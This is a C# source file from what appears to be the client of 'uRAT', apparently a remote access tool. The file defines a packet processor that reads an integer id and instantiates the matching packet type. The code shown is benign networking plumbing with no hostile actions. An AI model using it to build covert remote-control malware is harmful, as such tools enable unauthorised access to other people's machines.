using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using uNet2.Packet;


namespace uRAT.Client
{
    public class StandardPacketProcessor : IPacketProcessor
    {
        public Dictionary<int, Type> PacketTable { get; set; }

        public StandardPacketProcessor()
        {
            PacketTable = new Dictionary<int, Type>();
        }

        public byte[] ProcessRawData(byte[] rawData)
        {
            return rawData;
        }

        public IDataPacket ParsePacket(Stream data)
        {
            var br = new BinaryReader(data);
            var id = br.ReadInt32();
            var packet = (IDataPacket)Activator.CreateInstance(PacketTable[id]);
            return packet;
        }
    }

}
